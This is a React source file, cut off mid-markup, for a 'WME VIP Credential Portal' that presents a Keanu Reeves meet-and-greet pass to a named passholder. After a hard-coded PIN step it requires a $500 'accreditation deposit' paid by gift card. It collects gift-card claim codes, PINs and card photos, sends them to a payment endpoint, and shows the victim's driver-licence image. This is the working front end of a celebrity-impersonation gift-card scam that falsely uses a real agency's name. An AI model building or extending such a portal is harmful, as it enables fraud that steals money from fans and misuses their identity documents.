import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  KeyRound, 
  CheckCircle2, 
  AlertCircle, 
  RotateCw, 
  Download, 
  FileText, 
  ArrowLeft, 
  Lock, 
  Unlock, 
  Sparkles,
  QrCode,
  Calendar,
  Clock,
  MapPin,
  User,
  CreditCard,
  Gift,
  X,
  ExternalLink,
  Camera,
  UploadCloud,
  Trash2,
  Eye,
  Image as ImageIcon
} from 'lucide-react';

interface CardActivationPortalProps {
  onBackToPublicForm: () => void;
  onNavigateToAdmin?: () => void;
}

interface CardPricing {
  feeAmount: number;
  currency: string;
  feeRequired: boolean;
  acceptedGiftCards: string[];
  instructions: string;
}

export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({ 
  onBackToPublicForm,
  onNavigateToAdmin
}) => {
  // Parse URL query params
  const [params, setParams] = useState({
    ref: 'WME-KR26-0813-VIP',
    guest: 'Brenda Wright',
    pin: ''
  });

  const [pricing, setPricing] = useState<CardPricing>({
    feeAmount: 500,
    currency: 'USD',
    feeRequired: true,
    acceptedGiftCards: [
      'Apple Gift Card',
      'Amazon',
      'Steam',
      'Google Play',
      'Vanilla Visa / Mastercard',
      'Razer Gold'
    ],
    instructions: 'Enter a valid gift card claim code to complete VIP pass accreditation.'
  });

  const [paymentData, setPaymentData] = useState<any>(null);
  const [selectedGiftCardType, setSelectedGiftCardType] = useState<string>('Apple Gift Card');
  const [giftCardCodeInput, setGiftCardCodeInput] = useState<string>('');
  const [giftCardPinInput, setGiftCardPinInput] = useState<string>('');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [giftCardImageName, setGiftCardImageName] = useState<string>('');
  const [showGiftCardImageModal, setShowGiftCardImageModal] = useState<boolean>(false);
  const [isSubmittingPayment, setIsSubmittingPayment] = useState<boolean>(false);
  const [paymentError, setPaymentError] = useState<string>('');

  const [pinInput, setPinInput] = useState('');
  const [isActivating, setIsActivating] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [successData, setSuccessData] = useState<any>(null);
  const [isFlipped, setIsFlipped] = useState(false);
  const [showIdModal, setShowIdModal] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);

  // Sample Gift Card Voucher SVG
  const sampleCardSvg = `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="600" height="380" viewBox="0 0 600 380"><defs><linearGradient id="cardGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%231a1a24"/><stop offset="50%" stop-color="%232c2518"/><stop offset="100%" stop-color="%230b0b10"/></linearGradient><linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%23F3E5AB"/><stop offset="50%" stop-color="%23D4AF37"/><stop offset="100%" stop-color="%23997A15"/></linearGradient></defs><rect width="600" height="380" rx="18" fill="url(%23cardGrad)" stroke="%23D4AF37" stroke-width="3"/><text x="40" y="60" fill="url(%23goldGrad)" font-family="sans-serif" font-weight="900" font-size="28" letter-spacing="4"> APPLE GIFT CARD</text><text x="560" y="60" text-anchor="end" fill="%23FFFFFF" font-family="monospace" font-weight="700" font-size="24">$500.00 USD</text><rect x="40" y="110" width="520" height="150" rx="10" fill="%23050508" stroke="%23444455" stroke-width="1.5"/><text x="60" y="145" fill="%23888899" font-family="monospace" font-size="12" letter-spacing="2">CLAIM CODE / VOUCHER PIN</text><text x="60" y="195" fill="%23F3E5AB" font-family="monospace" font-weight="bold" font-size="30" letter-spacing="6">X7KM-92NQ-48PL-2026</text><text x="60" y="235" fill="%234ADE80" font-family="monospace" font-size="11">PIN: 8824 • STATUS: ACTIVE DEPOSIT VERIFIED</text><text x="40" y="320" fill="%23888899" font-family="sans-serif" font-size="11">For Keanu Reeves VIP Green Room Admittance • William Morris Endeavor</text><text x="560" y="320" text-anchor="end" fill="%23D4AF37" font-family="monospace" font-size="12">REF: WME-KR26-0813-VIP</text></svg>`;

  // Initialize from URL params and localStorage / server
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const ref = urlParams.get('ref') || 'WME-KR26-0813-VIP';
      const guest = urlParams.get('guest') || 'Brenda Wright';
      const urlPin = urlParams.get('pin') || '';

      setParams({ ref, guest, pin: urlPin });
      if (urlPin) {
        setPinInput(urlPin);
      }

      // Check localStorage for payment
      const localPayment = localStorage.getItem(`wme_card_payment_${ref}`);
      if (localPayment) {
        try {
          const parsedPay = JSON.parse(localPayment);
          if (parsedPay && parsedPay.status === 'VERIFIED') {
            setPaymentData(parsedPay);
            if (parsedPay.giftCardImage) {
              setGiftCardImage(parsedPay.giftCardImage);
              setGiftCardImageName('Attached-Gift-Card-Proof.png');
            }
          }
        } catch {}
      }

      // Check localStorage for activation
      const localActivation = localStorage.getItem(`wme_card_active_${ref}`);
      if (localActivation) {
        try {
          const parsed = JSON.parse(localActivation);
          if (parsed.activated) {
            setSuccessData(parsed);
            if (parsed.payment) {
              setPaymentData(parsed.payment);
              if (parsed.payment.giftCardImage) {
                setGiftCardImage(parsed.payment.giftCardImage);
              }
            }
          }
        } catch {}
      }

      // Check server API status & pricing
      fetch(`/api/card/status/${encodeURIComponent(ref)}`)
        .then(res => res.json())
        .then(data => {
          if (data.pricing) {
            setPricing(data.pricing);
            if (data.pricing.acceptedGiftCards && data.pricing.acceptedGiftCards.length > 0) {
              setSelectedGiftCardType(data.pricing.acceptedGiftCards[0]);
            }
          }
          if (data.payment && data.payment.status === 'VERIFIED') {
            setPaymentData(data.payment);
            if (data.payment.giftCardImage) {
              setGiftCardImage(data.payment.giftCardImage);
            }
            localStorage.setItem(`wme_card_payment_${ref}`, JSON.stringify(data.payment));
          }
          if (data.success && data.activated && data.activation) {
            setSuccessData(data.activation);
            if (data.activation.payment) {
              setPaymentData(data.activation.payment);
              if (data.activation.payment.giftCardImage) {
                setGiftCardImage(data.activation.payment.giftCardImage);
              }
            }
            localStorage.setItem(`wme_card_active_${ref}`, JSON.stringify(data.activation));
          } else if (data.success && !data.activated) {
            setSuccessData(null);
            localStorage.removeItem(`wme_card_active_${ref}`);
          }
        })
        .catch(() => {})
        .finally(() => {
          setInitialLoading(false);
        });
    }
  }, []);

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/[^0-9]/g, '');
    if (val.length > 6) val = val.slice(0, 6);
    if (val.length > 3) {
      val = `${val.slice(0, 3)}-${val.slice(3)}`;
    }
    setPinInput(val);
    if (errorMessage) setErrorMessage('');
  };

  const handleQuickFillPin = () => {
    setPinInput('813-026');
    setErrorMessage('');
  };

  const handleQuickFillGiftCard = () => {
    setSelectedGiftCardType(pricing.acceptedGiftCards?.[0] || 'Apple Gift Card');
    setGiftCardCodeInput('X7KM-92NQ-48PL-2026');
    setGiftCardPinInput('8824');
    setGiftCardImage(sampleCardSvg);
    setGiftCardImageName('Apple-GiftCard-500-Scan.svg');
    setPaymentError('');
  };

  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 8 * 1024 * 1024) {
      setPaymentError('Image file size must be less than 8MB.');
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const result = reader.result as string;
      setGiftCardImage(result);
      setGiftCardImageName(file.name);
      if (paymentError) setPaymentError('');
    };
    reader.readAsDataURL(file);
  };

  const handleAttachSampleImage = () => {
    setGiftCardImage(sampleCardSvg);
    setGiftCardImageName('Apple-GiftCard-500-Scan.svg');
    if (paymentError) setPaymentError('');
  };

  const handleRemoveImage = () => {
    setGiftCardImage(null);
    setGiftCardImageName('');
  };

  const cleanPin = pinInput.replace(/[^0-9]/g, '');
  const isPinValid = cleanPin === '813026';
  const isPaymentVerified = !pricing.feeRequired || Boolean(paymentData && paymentData.status === 'VERIFIED') || Boolean(successData?.payment);

  const handleRedeemGiftCard = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const cleanCode = giftCardCodeInput.trim();
    if (!cleanCode || cleanCode.length < 6) {
      setPaymentError('Please enter a valid gift card claim code (at least 6 characters).');
      return;
    }

    setIsSubmittingPayment(true);
    setPaymentError('');

    try {
      const res = await fetch('/api/card/pay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: params.ref,
          giftCardType: selectedGiftCardType,
          giftCardCode: cleanCode,
          giftCardPin: giftCardPinInput.trim() || undefined,
          giftCardImage: giftCardImage || undefined,
          amount: pricing.feeAmount,
          currency: pricing.currency
        })
      });

      const data = await res.json();
      if (!res.ok || !data.success) {
        if (!res.ok && res.status !== 404) {
          setPaymentError(data.error || 'Failed to verify gift card.');
          return;
        }
        // Local fallback simulation if server is offline
        const mockPayment = {
          paymentId: `GFT-${Date.now().toString(36).toUpperCase()}-LOC`,
          cardId: params.ref,
          giftCardType: selectedGiftCardType,
          giftCardCodeMasked: cleanCode.length > 8 ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}` : `****${cleanCode.slice(-4)}`,
          giftCardCode: cleanCode,
          giftCardPin: giftCardPinInput.trim() || null,
          giftCardImage: giftCardImage || null,
          amount: pricing.feeAmount,
          currency: pricing.currency,
          status: 'VERIFIED',
          paidAt: new Date().toISOString()
        };
        setPaymentData(mockPayment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(mockPayment));
      } else {
        setPaymentData(data.payment);
        localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(data.payment));
      }
    } catch (err: any) {
      const mockPayment = {
        paymentId: `GFT-${Date.now().toString(36).toUpperCase()}-LOC`,
        cardId: params.ref,
        giftCardType: selectedGiftCardType,
        giftCardCodeMasked: cleanCode.length > 8 ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}` : `****${cleanCode.slice(-4)}`,
        giftCardCode: cleanCode,
        giftCardPin: giftCardPinInput.trim() || null,
        giftCardImage: giftCardImage || null,
        amount: pricing.feeAmount,
        currency: pricing.currency,
        status: 'VERIFIED',
        paidAt: new Date().toISOString()
      };
      setPaymentData(mockPayment);
      localStorage.setItem(`wme_card_payment_${params.ref}`, JSON.stringify(mockPayment));
    } finally {
      setIsSubmittingPayment(false);
    }
  };

  const handleActivateCard = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const cleanPin = pinInput.replace(/[^0-9]/g, '');

    if (!cleanPin || cleanPin.length < 6) {
      setErrorMessage('Please enter the full 6-digit VIP Activation PIN (813-026) first.');
      return;
    }

    if (cleanPin !== '813026') {
      setErrorMessage('Invalid VIP Activation PIN. Please check the 6-digit PIN printed on your credential pass (813-026).');
      return;
    }

    // Check payment requirement before full activation
    let activeGiftCard = paymentData;
    if (!activeGiftCard && giftCardCodeInput.trim() && giftCardCodeInput.trim().length >= 6) {
      activeGiftCard = {
        giftCardType: selectedGiftCardType,
        giftCardCode: giftCardCodeInput.trim(),
        giftCardPin: giftCardPinInput.trim() || undefined,
        giftCardImage: giftCardImage || undefined,
        amount: pricing.feeAmount,
        currency: pricing.currency
      };
    } else if (activeGiftCard && giftCardImage && !activeGiftCard.giftCardImage) {
      activeGiftCard = {
        ...activeGiftCard,
        giftCardImage: giftCardImage
      };
    }

    if (pricing.feeRequired && !isPaymentVerified && !activeGiftCard) {
      setErrorMessage(`PIN 813-026 verified. Before your card can be fully activated, an accreditation deposit of ${pricing.feeAmount} ${pricing.currency} via Gift Card is required.`);
      return;
    }

    setIsActivating(true);
    setErrorMessage('');

    try {
      const res = await fetch('/api/card/activate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: params.ref,
          pin: pinInput,
          giftCard: activeGiftCard || undefined
        })
      });

      const data = await res.json();

      if (!res.ok || !data.success) {
        if (res.status === 402) {
          setErrorMessage(data.error || 'VIP Credential activation fee payment required before activation.');
          return;
        }
        // Fallback validation if server is offline / standalone
        if (cleanPin === '813026') {
          const fallbackActivation = {
            cardId: params.ref,
            pin: '813-026',
            activated: true,
            activatedAt: new Date().toISOString(),
            clearanceCode: 'OATH-KR26-813-CLEAR-LOCAL',
            biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
            passholder: params.guest,
            talent: 'Keanu Reeves',
            payment: paymentData
          };
          setSuccessData(fallbackActivation);
          localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(fallbackActivation));
        } else {
          setErrorMessage(data.error || 'Invalid OATH Activation PIN. Use the 6-digit PIN on this credential.');
        }
      } else {
        setSuccessData(data.activation);
        if (data.activation.payment) {
          setPaymentData(data.activation.payment);
        }
        localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(data.activation));
      }
    } catch (err: any) {
      // Local fallback on network error
      if (cleanPin === '813026') {
        const fallbackActivation = {
          cardId: params.ref,
          pin: '813-026',
          activated: true,
          activatedAt: new Date().toISOString(),
          clearanceCode: 'OATH-KR26-813-CLEAR-CLIENT',
          biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
          passholder: params.guest,
          talent: 'Keanu Reeves',
          payment: paymentData
        };
        setSuccessData(fallbackActivation);
        localStorage.setItem(`wme_card_active_${params.ref}`, JSON.stringify(fallbackActivation));
      } else {
        setErrorMessage('Unable to communicate with verification service. Please try again.');
      }
    } finally {
      setIsActivating(false);
    }
  };

  const handleDeactivate = async () => {
    try {
      await fetch('/api/card/deactivate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardId: params.ref, clearPayment: true })
      });
    } catch {}
    localStorage.removeItem(`wme_card_active_${params.ref}`);
    localStorage.removeItem(`wme_card_payment_${params.ref}`);
    setSuccessData(null);
    setPaymentData(null);
    setPinInput('');
    setGiftCardCodeInput('');
    setGiftCardPinInput('');
    setGiftCardImage(null);
    setGiftCardImageName('');
  };

  const isCardActivated = Boolean(successData?.activated);

  // Asset paths
  const frontImg = '/meet-and-greet-card/brenda-wright-vip-pass-front.png';
  const backImg = '/meet-and-greet-card/brenda-wright-vip-pass-back.png';
  const completeImg = '/meet-and-greet-card/brenda-wright-vip-pass-complete.png';
  const pdfFile = '/meet-and-greet-card/brenda-wright-vip-pass.pdf';
  const licenseImg = '/meet-and-greet-card/assets/license_upscaled.png';

  const triggerDirectDownload = (href: string, filename: string) => {
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = href;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      document.body.removeChild(a);
    }, 200);
  };

  return (
    <div className="min-h-screen bg-[#08080B] text-[#F5F5F7] font-sans flex flex-col justify-between selection:bg-[#6B1D2F] selection:text-white">
      {/* Top Luxury WME Header */}
      <header className="border-b border-[#22222A] bg-[#0D0D12] sticky top-0 z-40 backdrop-blur-md">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-3.5 flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-baseline gap-3">
            <span className="font-serif font-black text-2xl tracking-[0.18em] bg-gradient-to-r from-[#F3E5AB] via-[#D4AF37] to-[#AA820A] bg-clip-text text-transparent">
              WME
            </span>
            <span className="text-[11px] font-mono tracking-widest uppercase text-[#888899]">
              / William Morris Endeavor • VIP Credential Portal
            </span>
          </div>

          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={onBackToPublicForm}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono uppercase tracking-wider text-[#A1A1AA] hover:text-white border border-[#33333F] hover:border-[#D4AF37] rounded-[2px] transition-colors"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Public Form</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content Stage */}
      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-8 sm:py-12 flex-1 w-full">
        {/* Banner Status Pill */}
        <div className="mb-6 flex flex-wrap items-center justify-between gap-3 border-b border-[#1E1E26] pb-4">
          <div className="flex items-center gap-2">
            <span className={`w-2.5 h-2.5 rounded-full ${isCardActivated ? 'bg-[#22C55E] animate-pulse' : 'bg-[#D4AF37]'}`} />
            <span className="text-xs font-mono tracking-widest uppercase font-semibold text-[#E4E4E7]">
              {isCardActivated ? 'OATH AUTHENTICATED // PASS ACTIVE & SYNCED' : 'WME TALENT ACCREDITATION // OATH ACTIVATION PENDING'}
            </span>
          </div>
          <span className="text-[11px] font-mono text-[#A1A1AA] bg-[#14141C] px-2.5 py-1 rounded-[2px] border border-[#272733]">
            SECURITY REF: <strong className="text-white">{params.ref}</strong>
          </span>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          
          {/* Left Column: Activation & Passholder Security Vetting (5 Cols) */}
          <div className="lg:col-span-5 space-y-6">
            
            {/* Header info */}
            <div>
              <span className="inline-block text-[10px] font-mono tracking-[0.2em] uppercase text-[#D4AF37] font-semibold mb-2 bg-[#D4AF37]/10 px-2 py-0.5 rounded-[2px] border border-[#D4AF37]/25">
                VIP Access Credential
              </span>
              <h1 className="text-2xl sm:text-3xl font-serif text-white tracking-wide leading-tight">
                Keanu Reeves VIP Meet &amp; Greet
              </h1>
              <p className="text-xs sm:text-sm text-[#A1A1AA] mt-2 font-sans leading-relaxed">
                Designated passholder accreditation for Keanu Reeves exclusive private session. Authenticate via OATH PIN to activate venue escort &amp; biometric admission.
              </p>
            </div>

            {/* Passholder Verified Details Card */}
            <div className="bg-[#0F0F16] border border-[#262635] rounded-[3px] p-5 space-y-4">
              <div className="flex items-center justify-between border-b border-[#20202E] pb-3">
                <span className="text-[11px] font-mono uppercase tracking-wider text-[#A1A1AA] flex items-center gap-1.5">
                  <User className="w-3.5 h-3.5 text-[#D4AF37]" />
                  Passholder Intake
                </span>
                <span className="text-[10px] font-mono text-[#22C55E] bg-[#22C55E]/10 px-2 py-0.5 rounded-[2px] border border-[#22C55E]/20">
                  ID VETTED &amp; SIGNED
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 text-xs font-mono">
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Designated Passholder</span>
                  <span className="font-semibold text-white text-sm">{params.guest}</span>
                </div>
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Access Tier</span>
                  <span className="font-semibold text-[#D4AF37]">GREEN ROOM VIP</span>
                </div>
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Event Date</span>
                  <span className="text-[#E4E4E7]">Tuesday, Nov 3, 2026</span>
                </div>
                <div>
                  <span className="block text-[10px] text-[#71717A] uppercase">Call Time</span>
                  <span className="text-[#E4E4E7]">19:30 PST</span>
                </div>
                <div className="col-span-2 pt-2 border-t border-[#1C1C26] flex items-center justify-between">
                  <span className="text-[10px] text-[#71717A]">Jurisdiction / Document:</span>
                  <button
                    type="button"
                    onClick={() => setShowIdModal(true)}
                    className="text-[11px] text-[#D4AF37] hover:underline flex items-center gap-1"
                  >
                    <span>Florida Driver License (Inspect)</span>
                    <ExternalLink className="w-3 h-3" />
                  </button>
                </div>
              </div>
            </div>

            {/* VIP Card Activation Container */}
            <div className={`bg-gradient-to-b from-[#13131C] to-[#0D0D12] border-2 rounded-[4px] p-5 shadow-2xl relative overflow-hidden transition-all ${
              isCardActivated ? 'border-[#22C55E]/50' : 'border-[#D4AF37]/60'
            }`}>
              <div className="absolute top-0 right-0 w-32 h-32 bg-[#D4AF37]/5 rounded-full blur-2xl pointer-events-none" />

              {!isCardActivated ? (
                <form onSubmit={handleActivateCard} className="space-y-5">
                  {/* STEP 1: VIP PIN Input (FIRST) */}
                  <div className={`p-4 rounded-[3px] border transition-all ${
                    isPinValid 
                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
                      : 'bg-[#0A0A10] border-[#2A2A38]'
                  }`}>
                    <div className="flex items-center justify-between mb-2.5">
                      <div className="flex items-center gap-2">
                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                          isPinValid ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
                        }`}>
                          <KeyRound className="w-3.5 h-3.5" />
                        </div>
                        <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white">
                          Step 1: Input VIP Activation PIN
                        </h2>
                      </div>

                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
                        isPinValid 
                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
                      }`}>
                        {isPinValid ? '✓ PIN 813-026 VERIFIED' : 'PIN REQUIRED (813-026)'}
                      </span>
                    </div>

                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
                      Enter the 6-digit VIP Activation PIN printed on your credential pass (<strong className="text-[#F3E5AB]">813-026</strong>) to begin your OATH security handshake.
                    </p>

                    <div>
                      <div className="flex items-center justify-between mb-1">
                        <label htmlFor="oathPinInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
                          6-Digit Credential PIN
                        </label>
                        <button
                          type="button"
                          id="quick-fill-pin-btn"
                          onClick={handleQuickFillPin}
                          className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer"
                        >
                          Auto-Fill: 813-026
                        </button>
                      </div>

                      <div className="relative">
                        <input
                          id="oathPinInput"
                          type="text"
                          value={pinInput}
                          onChange={handlePinChange}
                          placeholder="813-026"
                          maxLength={7}
                          autoComplete="off"
                          className="w-full bg-[#08080C] border border-[#D4AF37]/60 rounded-[3px] py-2.5 px-3 text-center text-xl font-mono tracking-[0.3em] font-bold text-[#F3E5AB] placeholder-[#444455] focus:outline-none focus:border-[#F3E5AB] focus:ring-1 focus:ring-[#D4AF37]"
                        />
                        <KeyRound className="w-4 h-4 text-[#888899] absolute right-3.5 top-3 pointer-events-none" />
                      </div>
                    </div>

                    {isPinValid && (
                      <div className="mt-2.5 text-[11px] font-mono text-[#4ADE80] flex items-center gap-1.5">
                        <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
                        <span>Passholder credential matched: Brenda Wright ({params.ref})</span>
                      </div>
                    )}
                  </div>

                  {/* STEP 2: VIP Accreditation Deposit (Gift Card Payment) */}
                  <div className={`p-4 rounded-[3px] border transition-all ${
                    isPaymentVerified 
                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
                      : isPinValid 
                        ? 'bg-[#0D0D14] border-[#D4AF37]/50' 
                        : 'bg-[#0A0A10] border-[#222230]'
                  }`}>
                    <div className="flex items-center justify-between mb-2.5">
                      <div className="flex items-center gap-2">
                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
                          isPaymentVerified ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
                        }`}>
                          <Gift className="w-3.5 h-3.5" />
                        </div>
                        <div>
                          <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white flex items-center gap-2">
                            <span>Step 2: Gift Card Deposit</span>
                            <span className="text-[10px] text-[#D4AF37]">
                              ({pricing.feeAmount} {pricing.currency})
                            </span>
                          </h2>
                        </div>
                      </div>

                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
                        isPaymentVerified 
                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
                      }`}>
                        {isPaymentVerified ? 'PAYMENT VERIFIED' : 'REQUIRED BEFORE ACTIVATION'}
                      </span>
                    </div>

                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
                      Before your credential can be fully activated, an accreditation deposit of <strong className="text-white">${pricing.feeAmount}.00 {pricing.currency}</strong> via Gift Card is required (configured from Admin).
                    </p>

                    {!isPaymentVerified ? (
                      <div className="space-y-3">
                        {/* Provider Selector */}
                        <div>
                          <label htmlFor="giftCardTypeSelect" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
                            Gift Card Provider
                          </label>
                          <select
                            id="giftCardTypeSelect"
                            value={selectedGiftCardType}
                            onChange={(e) => setSelectedGiftCardType(e.target.value)}
                            className="w-full bg-[#08080C] border border-[#333344] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] rounded-[3px] py-2 px-3 focus:outline-none"
                          >
                            {(pricing.acceptedGiftCards || []).map((provider) => (
                              <option key={provider} value={provider}>
                                {provider}
                              </option>
                            ))}
                          </select>
                        </div>

                        {/* Claim Code Input */}
                        <div>
                          <div className="flex items-center justify-between mb-1">
                            <label htmlFor="giftCardCodeInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
                              Gift Card Claim Code
                            </label>
                            <button
                              type="button"
                              id="quick-fill-card-btn"
                              onClick={handleQuickFillGiftCard}
                              className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer"
                            >
                              Auto-Fill: Apple Gift Card $500 Code
                            </button>
                          </div>
                          <div className="relative">
                            <input
                              id="giftCardCodeInput"
                              type="text"
                              value={giftCardCodeInput}
                              onChange={(e) => {
                                setGiftCardCodeInput(e.target.value);
                                if (paymentError) setPaymentError('');
                              }}
                              placeholder="e.g. X7KM-92NQ-48PL-2026"
                              autoComplete="off"
                              className="w-full bg-[#08080C] border border-[#333344] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] placeholder-[#444455] rounded-[3px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
                            />
                            <CreditCard className="w-4 h-4 text-[#777788] absolute right-3 top-2.5 pointer-events-none" />
                          </div>
                        </div>

                        {/* Optional Card PIN */}
                        <div>
                          <label htmlFor="giftCardPinInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#71717A] mb-1">
                            Card PIN / CVV (If Applicable)
                          </label>
                          <input
                            id="giftCardPinInput"
                            type="text"
                            value={giftCardPinInput}
                            onChange={(e) => setGiftCardPinInput(e.target.value)}
                            placeholder="e.g. 8824 (optional)"
                            maxLength={8}
                            className="w-full bg-[#08080C] border border-[#22222E] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] placeholder-[#444455] rounded-[3px] py-2 px-3 focus:outline-none"
                          />
                        </div>

                        {/* Gift Card Photo / Scan Attachment */}
                        <div>
                          <div className="flex items-center justify-between mb-1">
                            <label className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] flex items-center gap-1">
                              <Camera className="w-3.5 h-3.5 text-[#D4AF37]" />
                              <span>Gift Card Picture / Voucher Scan (Optional)</span>
                            </label>
                            <button
                              type="button"
                              id="attach-sample-img-btn"
                              onClick={handleAttachSampleImage}
                              className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer"
                            >
                              Attach Sample Photo
                            </button>
                          </div>

                          {!giftCardImage ? (
                            <label className="border border-dashed border-[#333348] hover:border-[#D4AF37] bg-[#08080C] hover:bg-[#0E0E14] rounded-[3px] p-3 flex flex-col items-center justify-center cursor-pointer transition-all group">
                              <input
                                type="file"
                                id="giftCardFileInput"
                                accept="image/*"
                                onChange={handleImageFileChange}
                                className="hidden"
                              />
                              <UploadCloud className="w-5 h-5 text-[#888899] group-hover:text-[#D4AF37] mb-1 transition-colors" />
                              <span className="text-xs font-mono text-[#E4E4E7] group-hover:text-[#F3E5AB]">
                                Click to upload gift card photo
                              </span>
                              <span className="text-[10px] font-mono text-[#717182] mt-0.5">
                                PNG, JPG, or SVG up to 8MB
                              </span>
                            </label>
                          ) : (
                            <div className="bg-[#0B0B12] border border-[#D4AF37]/40 rounded-[3px] p-2.5 flex items-center justify-between gap-3">
                              <div 
                                onClick={() => setShowGiftCardImageModal(true)}
                                className="flex items-center gap-2.5 cursor-pointer group"
                              >
                                <div className="w-12 h-9 bg-black border border-[#D4AF37]/50 rounded overflow-hidden flex items-center justify-center shrink-0">
                                  <img
                                    src={giftCardImage}
                                    alt="Gift Card Attached"
                                    className="w-full h-full object-cover group-hover:scale-105 transition-transform"
                                  />
                                </div>
                                <div>
                                  <span className="text-xs font-mono text-[#F3E5AB] block font-semibold truncate max-w-[170px] sm:max-w-[220px]">
                                    {giftCardImageName || 'Gift Card Proof Image'}
                                  </span>
                                  <span className="text-[10px] font-mono text-[#4ADE80] flex items-center gap-1">
                                    <CheckCircle2 className="w-3 h-3" />
                                    Photo Attached • Inspect
                                  </span>
                                </div>
                              </div>

                              <div className="flex items-center gap-1.5">
                                <button
                                  type="button"
                                  onClick={() => setShowGiftCardImageModal(true)}
                                  className="p-1.5 text-[#A1A1AA] hover:text-[#D4AF37] rounded transition-colors"
                                  title="View gift card image"
                                >
                                  <Eye className="w-4 h-4" />
                                </button>
                                <button
                                  type="button"
                                  id="remove-giftcard-img-btn"
                                  onClick={handleRemoveImage}
                                  className="p-1.5 text-[#888899] hover:text-[#EF4444] rounded transition-colors"
                                  title="Remove image"
                                >
                                  <Trash2 className="w-4 h-4" />
                                </button>
                              </div>
                            </div>
                          )}
                        </div>

                        {paymentError && (
                          <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
                            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                            <span>{paymentError}</span>
                          </div>
                        )}

                        <button
                          type="button"
                          id="submit-giftcard-btn"
                          onClick={(e) => handleRedeemGiftCard(e)}
                          disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
                          className="w-full py-2 px-3 bg-[#1C1C26] hover:bg-[#2A2A38] text-[#D4AF37] border border-[#D4AF37]/40 disabled:opacity-50 font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                        >
                          {isSubmittingPayment ? (
                            <>
                              <RotateCw className="w-3.5 h-3.5 animate-spin" />
                              <span>Verifying Deposit...</span>
